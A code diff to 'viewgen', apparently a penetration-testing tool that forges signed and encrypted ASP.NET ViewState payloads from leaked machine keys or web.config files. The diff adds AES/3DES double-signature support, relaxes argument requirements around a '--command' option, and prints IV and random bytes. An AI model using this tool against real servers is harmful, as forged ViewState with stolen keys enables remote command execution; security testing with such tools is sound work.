@@ -35,8 +35,9 @@ def warning(s):
 
 class ViewGen:
 	MD5_MODIFIER = b"\x00"*4
-	hash_algs = {"SHA1": hashlib.sha1, "MD5": hashlib.md5, "SHA256": hashlib.sha256, "SHA384": hashlib.sha384, "SHA512": hashlib.sha512}
-	hash_sizes = {"SHA1": 20, "MD5": 16, "SHA256": 32, "SHA384": 48, "SHA512": 64}
+	MODIFIER_SIZE = 4
+	hash_algs = {"SHA1": hashlib.sha1, "MD5": hashlib.md5, "SHA256": hashlib.sha256, "SHA384": hashlib.sha384, "SHA512": hashlib.sha512, "AES": hashlib.sha1, "3DES": hashlib.sha1}
+	hash_sizes = {"SHA1": 20, "MD5": 16, "SHA256": 32, "SHA384": 48, "SHA512": 64, "AES": 20, "3DES": 20}
 
 	def __init__(self, validation_key=None, validation_alg=None, dec_key=None, dec_alg=None, modifier=None, encrypted=False):
 		self.validation_key = validation_key
@@ -130,10 +131,17 @@ class ViewGen:
 		unpad_dec = unpad(dec)
 		self._random_bytes = unpad_dec[:random_bytes_size]
 		self._iv = iv
-		modifier = unpad_dec[-4:]
-		return base64.b64encode(unpad_dec[random_bytes_size:-4]), signature
+		modifier = unpad_dec[-ViewGen.MODIFIER_SIZE:]
+		idx = ViewGen.MODIFIER_SIZE
+		if self._double_signature:
+			idx += 20
+
+		return base64.b64encode(unpad_dec[random_bytes_size:-idx]), signature
 
 	def encrypt_and_sign(self, payload):
+		if self._double_signature:
+			payload = self.sign(payload)
+
 		data = base64.b64decode(payload)
 		enc, iv = self.encrypt(data)
 
@@ -191,8 +199,9 @@ class ViewGen:
 
 	def _init_validation_alg(self, validation_alg):
 		self.validation_alg = validation_alg.upper()
-		if self.validation_alg == "AES" or self.validation_alg == "3DES":
-			self.validation_alg = "SHA1"
+		self._double_signature = False
+		if "AES" in self.validation_alg or "3DES" in self.validation_alg:
+			self._double_signature = True
 
 	def _get_hash_size(self):
 		return self._search_dict(ViewGen.hash_sizes, self.validation_alg)
@@ -218,16 +227,16 @@ def read_webconfig(webconfig_path):
 	document = minidom.parse(webconfig_path)
 	machine_key = document.getElementsByTagName("machineKey")[0]
 	vkey = machine_key.getAttribute("validationKey")
-	valg = machine_key.getAttribute("validation")
+	valg = machine_key.getAttribute("validation").upper()
 	dkey = machine_key.getAttribute("decryptionKey")
-	dalg = machine_key.getAttribute("decryption")
+	dalg = machine_key.getAttribute("decryption").upper()
 	encrypted = False
 
 	for subelement in document.getElementsByTagName("pages"):
 		if subelement.getAttribute("viewStateEncryptionMode") == "Always":
 			encrypted = True
 
-	if valg == "AES":
+	if valg == "AES" or valg == "3DES":
 		encrypted = True
 
 	return vkey, valg, dkey, dalg, encrypted
@@ -236,17 +245,17 @@ def read_webconfig(webconfig_path):
 def parse_args():
 	parser = argparse.ArgumentParser(description="viewgen is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or web.config files")
 	parser.add_argument("--webconfig", help="automatically load keys and algorithms from a web.config file", required=False)
+	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default="00000000")
+	parser.add_argument("-c", "--command", help="Command to execute", required=False)
 	parser.add_argument("--decode", help="decode a ViewState payload", required=False, default=False, action="store_true")
 	parser.add_argument("--guess", help="guess signature and encryption mode for a given payload", required=False, default=False, action="store_true")
 	parser.add_argument("--check", help="check if modifier and keys are correct for a given payload", required=False, default=False, action="store_true")
-	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default="00000000")
-	parser.add_argument("-c", "--command", help="Command to execute", required=False)
 	parser.add_argument("--vkey", help="validation key", required=False, default="")
 	parser.add_argument("--valg", help="validation algorithm", required=False, default="")
 	parser.add_argument("--dkey", help="decryption key", required=False, default="")
 	parser.add_argument("--dalg", help="decryption algorithm", required=False, default="")
 	parser.add_argument("-e", "--encrypted", help="ViewState is encrypted", required=False, default=False, action="store_true")
-	parser.add_argument("payload", help="viewState payload (base 64 encoded)")
+	parser.add_argument("payload", help="ViewState payload (base 64 encoded)", nargs="?")
 	args = parser.parse_args()
 
 	if args.webconfig:
@@ -256,6 +265,10 @@ def parse_args():
 
 
 def run_viewgen(args):
+	if args.payload is None and args.command is None:
+		warning("The following arguments are required: payload")
+		exit(1)
+
 	generate = not args.decode and not args.check and not args.guess
 
 	if generate or args.check:
@@ -271,6 +284,8 @@ def run_viewgen(args):
 		pprint(viewstate)
 		if signature is not None:
 			success("Signature: %s" % str(binascii.hexlify(signature), "utf-8"))
+			success("IV: %s" % str(binascii.hexlify(viewgen._iv), "utf-8"))
+			success("RB: %s" % str(binascii.hexlify(viewgen._random_bytes), "utf-8"))
 
 	if args.check:
 		viewstate, sa = viewgen.decode(args.payload)
